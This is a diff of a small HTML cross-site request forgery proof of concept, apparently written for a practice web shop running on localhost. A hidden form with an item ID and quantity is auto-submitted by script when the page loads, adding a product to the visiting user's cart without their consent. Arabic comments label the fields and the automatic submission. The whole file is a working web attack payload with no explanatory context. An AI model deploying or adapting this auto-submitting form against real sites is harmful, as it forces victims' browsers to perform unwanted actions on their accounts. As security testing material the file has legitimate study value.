@@ -1,11 +1,12 @@
 <html>
 <body>
-  <form action="https://localhost:3000/#/basket/cart/add" method="POST">
-    <input type="hidden" name="item_id" value="12345"> <!-- منتج باهظ الثمن -->
-    <input type="hidden" name="quantity" value="1">
+  <form action="http://localhost:3000/cart/add" method="POST">
+    <input type="hidden" name="item_id" value="1"> <!-- ID المنتج -->
+    <input type="hidden" name="quantity" value="1"> <!-- الكمية -->
   </form>
   <script>
-    document.forms[0].submit();
+    document.forms[0].submit(); <!-- تنفيذ الطلب تلقائيًا -->
   </script>
 </body>
 </html>
+
